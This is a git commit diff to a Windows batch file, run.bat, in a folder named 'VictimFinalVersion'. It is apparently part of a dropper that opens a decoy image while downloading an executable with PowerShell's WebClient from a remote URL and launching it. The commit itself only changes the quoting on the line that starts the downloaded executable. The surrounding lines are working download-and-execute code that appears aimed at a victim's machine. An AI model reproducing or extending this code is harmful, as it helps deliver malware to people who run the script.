0a5c5fa301e510d153e059afbdc69a57d09260fa
devkaare <kaarehofferdal@gmail.com>
2025-02-02 06:07:31 +0100

    Feat

--- VictimFinalVersion/run.bat
+++ VictimFinalVersion/run.bat
@@ -11,6 +11,6 @@ powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('%imageU
 start !imageFile!
 
 powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('%execURL%', '%execFile%');"
-start "" !execFile!
+start "" "%execFile%"
 
 endlocal
